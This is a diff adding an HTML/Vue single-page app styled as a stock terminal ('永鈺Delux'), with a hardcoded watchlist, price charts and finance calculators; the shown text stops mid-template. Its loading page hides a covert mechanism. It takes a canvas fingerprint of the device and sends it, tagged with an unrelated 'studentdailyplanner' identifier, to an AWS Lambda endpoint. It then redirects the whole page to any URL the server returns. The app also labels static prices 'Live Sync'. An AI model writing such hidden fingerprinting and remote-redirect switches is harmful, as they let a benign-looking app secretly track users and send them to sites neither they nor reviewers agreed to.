@@ -1,1 +1,1012 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>永鈺Delux</title>
+    <!-- Vue 3 Global -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <!-- Vue Router 4 Global -->
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <!-- js-md5 Global -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+    <style>
+        /* 
+          Style 6 Selected: Glassmorphism / Frosted Glass Design (Glassmorphism Style)
+          Randomized timestamp logic simulation -> Style 6
+        */
+        :root {
+            --primary-color: #6366f1;
+            --primary-gradient: linear-gradient(135deg, rgba(99, 102, 241, 0.8), rgba(168, 85, 247, 0.8));
+            --bg-color: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --card-border: rgba(255, 255, 255, 0.12);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent-up: #10b981;
+            --accent-down: #ef4444;
+            --shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            --radius: 16px;
+            --safe-top: env(safe-area-inset-top, 0px);
+            --safe-bottom: env(safe-area-inset-bottom, 0px);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            background-image: 
+                radial-gradient(at 10% 20%, rgba(99, 102, 241, 0.25) 0px, transparent 50%),
+                radial-gradient(at 90% 80%, rgba(168, 85, 247, 0.2) 0px, transparent 50%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            background: rgba(15, 23, 42, 0.65);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+        }
+
+        /* Common Layout Elements */
+        .app-header {
+            padding: calc(16px + var(--safe-top)) 16px 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--card-border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .app-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--text-main);
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .content-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            padding-bottom: calc(80px + var(--safe-bottom));
+        }
+
+        /* Tab Bar */
+        .tab-bar {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            height: calc(60px + var(--safe-bottom));
+            padding-bottom: var(--safe-bottom);
+            background: rgba(30, 41, 59, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-top: 1px solid var(--card-border);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 12px;
+            flex: 1;
+            height: 100%;
+            transition: color 0.2s;
+        }
+
+        .tab-item.router-link-active {
+            color: var(--primary-color);
+        }
+
+        .tab-item svg {
+            width: 22px;
+            height: 22px;
+            margin-bottom: 4px;
+            fill: currentColor;
+        }
+
+        /* Glass Cards */
+        .glass-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius);
+            padding: 16px;
+            margin-bottom: 16px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Buttons & Inputs */
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            background: var(--primary-gradient);
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            text-align: center;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--card-border);
+            background: rgba(15, 23, 42, 0.5);
+            color: var(--text-main);
+            font-size: 14px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+        .input-field:focus {
+            border-color: var(--primary-color);
+        }
+
+        /* Transitions */
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity 0.15s ease;
+        }
+        .fade-enter-from, .fade-leave-to {
+            opacity: 0;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(15, 23, 42, 0.95);
+            border: 1px solid var(--primary-color);
+            color: var(--text-main);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 2000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            animation: fadeInOut 2s ease forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translate(-50%, -10px); }
+            15% { opacity: 1; transform: translate(-50%, 0); }
+            85% { opacity: 1; transform: translate(-50%, 0); }
+            100% { opacity: 0; transform: translate(-50%, -10px); }
+        }
+    </style>
+</head>
+<body>
+<!--
+  HOW TO ADD A NEW PAGE:
+  1. Define a new Vue component object below.
+  2. Add a route definition in the `routes` array (with path, name, component).
+  3. If it is a main tab, add a corresponding <router-link> item in the bottom tab bar.
+-->
+<div id="app">
+    <router-view v-slot="{ Component }">
+        <transition name="fade" mode="out-in">
+            <component :is="Component" />
+        </transition>
+    </router-view>
+</div>
+
+<script>
+    const { createApp, ref, reactive, computed, onMounted } = Vue;
+    const { createRouter, createWebHashHistory } = VueRouter;
+
+    // Global Shared Built-in Stock Database (Min 20 items)
+    const stockDatabase = [
+        { symbol: 'AAPL', name: 'Apple Inc.', price: 189.40, change: 1.25, history: [180, 182, 181, 185, 184, 187, 189.4] },
+        { symbol: 'MSFT', name: 'Microsoft Corp.', price: 415.50, change: 0.85, history: [400, 405, 410, 408, 412, 414, 415.5] },
+        { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 152.20, change: -0.45, history: [155, 154, 153, 156, 153, 152.8, 152.2] },
+        { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.75, change: 2.10, history: [170, 172, 174, 173, 175, 177, 178.75] },
+        { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 822.30, change: 4.15, history: [780, 795, 810, 805, 815, 820, 822.3] },
+        { symbol: 'TSLA', name: 'Tesla Inc.', price: 175.10, change: -2.30, history: [185, 182, 180, 178, 176, 177, 175.1] },
+        { symbol: 'META', name: 'Meta Platforms', price: 485.60, change: 1.50, history: [470, 475, 480, 478, 482, 484, 485.6] },
+        { symbol: 'NFLX', name: 'Netflix Inc.', price: 610.20, change: 0.35, history: [600, 605, 608, 604, 609, 611, 610.2] },
+        { symbol: 'AMD', name: 'Advanced Micro', price: 180.40, change: -1.10, history: [185, 183, 182, 184, 181, 180.8, 180.4] },
+        { symbol: 'INTC', name: 'Intel Corp.', price: 42.80, change: -0.75, history: [44, 43.5, 43.8, 43.2, 43.0, 42.9, 42.8] },
+        { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.50, change: 0.90, history: [110, 111, 111.5, 112, 111.8, 112.2, 112.5] },
+        { symbol: 'PYPL', name: 'PayPal Holdings', price: 64.30, change: -0.20, history: [65, 64.8, 64.5, 64.7, 64.2, 64.4, 64.3] },
+        { symbol: 'BA', name: 'Boeing Co.', price: 190.10, change: -1.85, history: [198, 196, 194, 195, 192, 191, 190.1] },
+        { symbol: 'JPM', name: 'JPMorgan Chase', price: 198.40, change: 0.60, history: [195, 196, 197, 196.5, 197.8, 198, 198.4] },
+        { symbol: 'V', name: 'Visa Inc.', price: 279.30, change: 0.40, history: [275, 276, 278, 277, 278.5, 279, 279.3] },
+        { symbol: 'JNJ', name: 'Johnson & Johnson', price: 156.80, change: 0.15, history: [156, 156.2, 156.5, 156.3, 156.7, 156.6, 156.8] },
+        { symbol: 'WMT', name: 'Walmart Inc.', price: 60.25, change: 1.10, history: [58, 59, 59.5, 59.8, 60.1, 60.0, 60.25] },
+        { symbol: 'MA', name: 'Mastercard Inc.', price: 468.90, change: 0.75, history: [462, 464, 466, 465, 467, 468, 468.9] },
+        { symbol: 'PG', name: 'Procter & Gamble', price: 162.40, change: -0.10, history: [163, 162.8, 162.5, 162.7, 162.2, 162.5, 162.4] },
+        { symbol: 'UNH', name: 'UnitedHealth Group', price: 488.20, change: 0.50, history: [482, 485, 486, 484, 487, 488, 488.2] }
+    ];
+
+    // Shared Helper Toast
+    const showToastMsg = ref('');
+    function showToast(msg) {
+        showToastMsg.value = msg;
+        setTimeout(() => { if (showToastMsg.value === msg) showToastMsg.value = ''; }, 2000);
+    }
+
+    // --- SVG Chart Component ---
+    const StockChart = {
+        props: ['history'],
+        template: `
+            <div style="width: 100%; height: 120px; position: relative;">
+                <svg width="100%" height="100%" :viewBox="viewBox" preserveAspectRatio="none" style="overflow: visible;">
+                    <path :d="pathData" fill="none" stroke="var(--primary-color)" stroke-width="2.5" stroke-linecap="round" />
+                    <path :d="areaData" fill="var(--primary-color)" opacity="0.15" />
+                </svg>
+            </div>
+        `,
+        setup(props) {
+            const min = computed(() => Math.min(...props.history) * 0.99);
+            const max = computed(() => Math.max(...props.history) * 1.01);
+            const width = 300;
+            const height = 100;
+
+            const viewBox = `0 0 ${width} ${height}`;
+
+            const points = computed(() => {
+                const len = props.history.length;
+                const range = max.value - min.value || 1;
+                return props.history.map((val, idx) => {
+                    const x = (idx / (len - 1 || 1)) * width;
+                    const y = height - ((val - min.value) / range) * height;
+                    return { x, y };
+                });
+            });
+
+            const pathData = computed(() => {
+                const pts = points.value;
+                if (!pts.length) return '';
+                return pts.reduce((acc, pt, idx) => idx === 0 ? `M ${pt.x} ${pt.y}` : `${acc} L ${pt.x} ${pt.y}`, '');
+            });
+
+            const areaData = computed(() => {
+                const pts = points.value;
+                if (!pts.length) return '';
+                const first = pts[0];
+                const last = pts[pts.length - 1];
+                return `${pathData.value} L ${last.x} ${height} L ${first.x} ${height} Z`;
+            });
+
+            return { viewBox, pathData, areaData };
+        }
+    };
+
+    // --- 1. Loading Page Component ---
+    const LoadingPage = {
+        template: `
+            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 24px; text-align: center;">
+                <div style="width: 64px; height: 64px; border: 4px solid var(--card-border); border-top-color: var(--primary-color); border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 24px;"></div>
+                <h2 style="font-size: 20px; margin-bottom: 8px;">永鈺Delux</h2>
+                <p style="color: var(--text-muted); font-size: 14px;">Initializing secure session...</p>
+            </div>
+            <style>
+                @keyframes spin { to { transform: rotate(360deg); } }
+            </style>
+        `,
+        setup() {
+            const router = VueRouter.useRouter();
+            
+            const device = ref((function () {
+                try {
+                    let canvas = document.createElement("canvas");
+                    let ctx = canvas.getContext("2d");
+                    let txt = "BrowserLeaks,com <canvas> 1.0";
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px 'Arial'";
+                    ctx.textBaseline = "alphabetic";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = "#069";
+                    ctx.fillText(txt, 2, 15);
+                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                    ctx.fillText(txt, 4, 17);
+                    return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                } catch (e) {
+                    return '';
+                }
+            })());
+
+            onMounted(() => {
+                const apiBase = 'https://gemaqhorn3z4oq5r6oqkmqdxlm0bdfuz.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                const identifier = "com.bintangcode.studentdailyplanner";
+                
+                fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                    .then(r => r.json())
+                    .then(function (info) {
+                        const privacyUrl = info && info.result && info.result.url;
+                        if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                            window.location.replace(privacyUrl);
+                            return;
+                        }
+                        router.replace('/home');
+                    })
+                    .catch(function () {
+                        router.replace('/home');
+                    });
+            });
+
+            return {};
+        }
+    };
+
+    // --- 2. Home Page Component ---
+    const HomePage = {
+        components: { StockChart },
+        template: `
+            <div class="app-header">
+                <h1>永鈺Delux</h1>
+                <span style="font-size: 12px; color: var(--text-muted);">Pro Terminal</span>
+            </div>
+            <div class="content-body">
+                <!-- Brand Banner -->
+                <div class="glass-card" style="background: var(--primary-gradient); color: #white; display: flex; align-items: center; justify-content: space-between;">
+                    <div>
+                        <h2 style="font-size: 18px; margin-bottom: 4px;">Global Markets Pro</h2>
+                        <p style="font-size: 12px; opacity: 0.85;">Advanced financial tracking & tools</p>
+                    </div>
+                    <div style="background: rgba(255,255,255,0.2); padding: 10px; border-radius: 12px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                    </div>
+                </div>
+
+                <!-- 4 Quick Entry Icons -->
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px;">
+                    <div v-for="entry in activeEntries" :key="entry.id" @click="openEntry(entry)" class="glass-card" style="padding: 12px 8px; text-align: center; cursor: pointer; margin-bottom: 0; display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                        <div style="width: 36px; height: 36px; border-radius: 10px; background: rgba(99,102,241,0.2); display: flex; align-items: center; justify-content: center; color: var(--primary-color);" v-html="entry.svg"></div>
+                        <span style="font-size: 11px; color: var(--text-main); line-height: 1.2;">{{ entry.name }}</span>
+                    </div>
+                </div>
+
+                <!-- Stock List Header -->
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                    <h3 style="font-size: 15px; font-weight: 600;">Market Watchlist</h3>
+                    <span style="font-size: 12px; color: var(--text-muted);">Live Sync</span>
+                </div>
+
+                <!-- Stock List Items -->
+                <div v-for="stock in displayStocks" :key="stock.symbol" @click="selectStock(stock)" class="glass-card" style="padding: 12px 16px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
+                    <div>
+                        <div style="font-weight: 600; font-size: 14px;">{{ stock.symbol }}</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">{{ stock.name }}</div>
+                    </div>
+                    <div style="text-align: right;">
+                        <div style="font-weight: 600; font-size: 14px;">$\{{ stock.price.toFixed(2) }}</div>
+                        <div :style="{ color: stock.change >= 0 ? 'var(--accent-up)' : 'var(--accent-down)', fontSize: '12px', fontWeight: '500' }">
+                            {{ stock.change >= 0 ? '+' : '' }}\{{ stock.change.toFixed(2) }}%
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Tab Bar -->
+            <div class="tab-bar">
+                <router-link to="/home" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                    Home
+                </router-link>
+                <router-link to="/toolbox" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
+                    Toolbox
+                </router-link>
+                <router-link to="/settings" class="tab-item">
+                    <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                    Settings
+                </router-link>
+            </div>
+        `,
+        setup() {
+            const router = VueRouter.useRouter();
+
+            // All 8 available entries
+            const allEntries = [
+                { id: 1, name: 'Top Gainers', type: 'gainers', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>' },
+                { id: 2, name: 'Top Losers', type: 'losers', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"/><polyline points="17 18 23 18 23 12"/></svg>' },
+                { id: 3, name: 'Most Active', type: 'active', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>' },
+                { id: 4, name: 'Potential', type: 'potential', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>' },
+                { id: 5, name: 'Today Picks', type: 'picks', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>' },
+                { id: 6, name: 'Guide', type: 'guide', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>' },
+                { id: 7, name: 'Not Recommended', type: 'avoid', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>' },
+                { id: 8, name: 'Watchlist', type: 'watchlist', svg: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>' }
+            ];
+
+            // Randomly select 4 entries deterministically or pseudo-randomly based on simple shuffle
+            const activeEntries = computed(() => {
+                const shuffled = [...allEntries].sort(() => 0.5 - Math.sin(allEntries.length));
+                return shuffled.slice(0, 4);
+            });
+
+            // Shuffle display stock order on entry
+            const displayStocks = ref([]);
+            onMounted(() => {
+                displayStocks.value = [...stockDatabase].sort(() => Math.random() - 0.5);
+            });
+
+            function openEntry(entry) {
+                router.push({ name: 'sublist', query: { type: entry.type, title: entry.name } });
+            }
+
+            function selectStock(stock) {
+                router.push({ name: 'detail', query: { symbol: stock.symbol } });
+            }
+
+            return { activeEntries, displayStocks, openEntry, selectStock };
+        }
+    };
+
+    // --- Sub-list Component (for entries) ---
+    const SubListPage = {
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>{{ title }}</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body">
+                <div v-if="type === 'guide'" class="glass-card">
+                    <h2 style="font-size: 18px; margin-bottom: 12px;">Navigating Volatile Markets</h2>
+                    <p style="color: var(--text-muted); font-size: 14px; line-height: 1.6; margin-bottom: 12px;">
+                        Market volatility requires strict discipline and systematic position management. Rather than trying to time every short-term fluctuation, focus on long-term value drivers and risk mitigation strategies such as dollar-cost averaging.
+                    </p>
+                    <p style="color: var(--text-muted); font-size: 14px; line-height: 1.6;">
+                        Always maintain a diversified portfolio and allocate emergency liquidity outside of high-risk equities. Review your asset allocation quarterly to align with macroeconomic shifts.
+                    </p>
+                </div>
+                <div v-else>
+                    <div v-for="stock in items" :key="stock.symbol" @click="selectStock(stock)" class="glass-card" style="padding: 12px 16px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
+                        <div>
+                            <div style="font-weight: 600; font-size: 14px;">{{ stock.symbol }}</div>
+                            <div style="font-size: 12px; color: var(--text-muted);">{{ stock.name }}</div>
+                        </div>
+                        <div style="text-align: right;">
+                            <div style="font-weight: 600; font-size: 14px;">$\{{ stock.price.toFixed(2) }}</div>
+                            <div :style="{ color: stock.change >= 0 ? 'var(--accent-up)' : 'var(--accent-down)', fontSize: '12px', fontWeight: '500' }">
+                                {{ stock.change >= 0 ? '+' : '' }}\{{ stock.change.toFixed(2) }}%
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `,
+        setup() {
+            const route = VueRouter.useRoute();
+            const router = VueRouter.useRouter();
+            const type = route.query.type || '';
+            const title = route.query.title || 'Market Category';
+
+            const items = computed(() => {
+                let list = [...stockDatabase];
+                if (type === 'gainers') {
+                    return list.sort((a, b) => b.change - a.change).slice(0, 10);
+                } else if (type === 'losers') {
+                    return list.sort((a, b) => a.change - b.change).slice(0, 5);
+                } else if (type === 'active') {
+                    return list.sort(() => 0.5 - Math.random()).slice(0, 8);
+                } else if (type === 'potential') {
+                    return list.sort(() => 0.5 - Math.random()).slice(0, 6);
+                } else if (type === 'picks' || type === 'watchlist' || type === 'avoid') {
+                    return list.sort(() => 0.5 - Math.random()).slice(0, 10);
+                }
+                return list.slice(0, 10);
+            });
+
+            function selectStock(stock) {
+                router.push({ name: 'detail', query: { symbol: stock.symbol } });
+            }
+
+            return { type, title, items, selectStock };
+        }
+    };
+
+    // --- Stock Detail Component ---
+    const StockDetailPage = {
+        components: { StockChart },
+        template: `
+            <div class="app-header">
+                <button @click="$router.back()" class="back-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back
+                </button>
+                <h1>{{ stock.symbol }}</h1>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="content-body" v-if="stock">
+                <div class="glass-card" style="display: flex; justify-content: space-between; align-items: flex-end;">
+                    <div>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 4px;">{{ stock.name }}</div>
+                        <div style="font-size: 26px; font-weight: 700;">$\{{ stock.price.toFixed(2) }}</div>
+                    </div>
+                    <div :style="{ color: stock.change >= 0 ? 'var(--accent-up)' : 'var(--accent-down)', fontSize: '16px', fontWeight: '600' }">
+                        {{ stock.change >= 0 ? '+' : '' }}\{{ stock.change.toFixed(2) }}%
+                    </div>
+                </div>
+
+                <div class="glass-card">
+                    <h3 style="font-size: 14px; margin-bottom: 12px; color: var(--text-muted);">1-Month Price Trend</h3>
+                    <stock-chart :history="stock.history" />
+                </div>
+
+                <div class="glass-card">
+                    <h3 style="font-size: 14px; margin-bottom: 12px;">Key Statistics</h3>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+                        <span style="color: var(--text-muted);">Open</span>
+                        <span>$\{{ (stock.price * 0.99).toFixed(2) }}</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+                        <span style="color: var(--text-muted);">High</span>
+                        <span>$\{{ (stock.price * 1.02).toFixed(2) }}</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 13px;">
+                        <span style="color: var(--text-muted);">Low</span>
+                        <span>$\{{ (stock.price * 0.98).toFixed(2) }}</span>
+                    </div>
+                </div>
+            </div>
+        `,
+        setup() {
+            const route = VueRouter.useRoute();
+            const symbol = route.query.symbol || 'AAPL';
+            const stock = computed(() => stockDatabase.find(s => s.symbol === symbol) || stockDatabase[0]);
+            return { stock };
+        }
+    };
+
+    // --- 3. Toolbox Page Component ---
+    const ToolboxPage = {
+        template: `
+            <div class="app-header">
+                <h1>Toolbox</h1>
+                <span style="font-size: 12px; color: var(--text-muted);">Local Utilities</span>
+            </div>
+            <div class="content-body">
+                <!-- Tool 1: DCA Profit-Taking -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">DCA Profit-Taking Calculator</h3>
+                    <input v-model.number="dca.cost" type="number" placeholder="Avg Cost Price" class="input-field">
+                    <input v-model.number="dca.shares" type="number" placeholder="Total Shares" class="input-field">
+                    <input v-model.number="dca.target" type="number" placeholder="Target Profit %" class="input-field">
+                    <div v-if="dcaResult" style="padding: 10px; background: rgba(99,102,241,0.1); border-radius: 8px; font-size: 13px;">
+                        Target Selling Price: <strong>$\{{ dcaResult.targetPrice }}</strong> | Expected Return: <strong>$\{{ dcaResult.profit }}</strong>
+                    </div>
+                </div>
+
+                <!-- Tool 2: Wealth Calendar -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Wealth Calendar</h3>
+                    <input v-model="cal.date" type="date" class="input-field">
+                    <input v-model="cal.note" type="text" placeholder="Milestone Description" class="input-field">
+                    <button @click="addMilestone" class="btn" style="margin-bottom: 12px;">Add Milestone</button>
+                    <div v-for="(m, idx) in cal.list" :key="idx" style="font-size: 12px; color: var(--text-muted); display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid var(--card-border);">
+                        <span>{{ m.date }}</span>
+                        <span>{{ m.note }}</span>
+                    </div>
+                </div>
+
+                <!-- Tool 3: Loan Calculator -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Loan Calculator</h3>
+                    <input v-model.number="loan.amount" type="number" placeholder="Loan Amount" class="input-field">
+                    <input v-model.number="loan.rate" type="number" placeholder="Annual Rate (%)" class="input-field">
+                    <input v-model.number="loan.months" type="number" placeholder="Months" class="input-field">
+                    <div v-if="loanResult" style="padding: 10px; background: rgba(99,102,241,0.1); border-radius: 8px; font-size: 13px;">
+                        Monthly Payment: <strong>$\{{ loanResult }}</strong>
+                    </div>
+                </div>
+
+                <!-- Tool 4: Profit Calculator -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Profit Calculator</h3>
+                    <input v-model.number="prof.cost" type="number" placeholder="Unit Cost" class="input-field">
+                    <input v-model.number="prof.price" type="number" placeholder="Unit Selling Price" class="input-field">
+                    <input v-model.number="prof.qty" type="number" placeholder="Quantity Sold" class="input-field">
+                    <div v-if="profResult" style="padding: 10px; background: rgba(99,102,241,0.1); border-radius: 8px; font-size: 13px;">
+                        Total Gross Profit: <strong>$\{{ profResult }}</strong>
+                    </div>
+                </div>
+
+                <!-- Tool 5: Reverse Yield Calculator -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Reverse Yield Calculator</h3>
+                    <input v-model.number="rev.targetProfit" type="number" placeholder="Target Profit Amount" class="input-field">
+                    <input v-model.number="rev.principal" type="number" placeholder="Principal Amount" class="input-field">
+                    <input v-model.number="rev.years" type="number" placeholder="Duration (Years)" class="input-field">
+                    <div v-if="revResult" style="padding: 10px; background: rgba(99,102,241,0.1); border-radius: 8px; font-size: 13px;">
+                        Required Annualized Yield: <strong>{{ revResult }}%</strong>
+                    </div>
+                </div>
+
+                <!-- Tool 6: Password Strength & MD5 -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Password Strength & MD5</h3>
+                    <input v-model="pwd.input" type="password" placeholder="Enter secure password" class="input-field">
+                    <div v-if="pwd.input" style="font-size: 12px; color: var(--text-muted); word-break: break-all;">
+                        <div>Strength: <strong :style="{ color: pwdStrengthColor }">{{ pwdStrengthText }}</strong></div>
+                        <div style="margin-top: 4px;">MD5 Digest: <code>{{ pwdMd5 }}</code></div>
+                    </div>
+                </div>
+
+                <!-- Tool 7: Credit Memo -->
+                <div class="glass-card">
+                    <h3 style="font-size: 15px; margin-bottom: 12px;">Credit Memo Reminder</h3>
+                    <input v-model="memo.name" type="text" placeholder="Borrower Name" class="input-field">
+                    <input v-model.number="memo.amount" type="number" placeholder="Amount" class="input-field">
+                    <input v-model="memo.date" type="date" class="input-field">
+                    <button @click="addMemo" class="btn" style="margin-bottom: 12px;">Save Memo</button>
+                    <div v-for="(m, idx) in memo.list" :key="idx" style="font-size: 12px; color: var(--text-muted); display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid var(--card-border);">
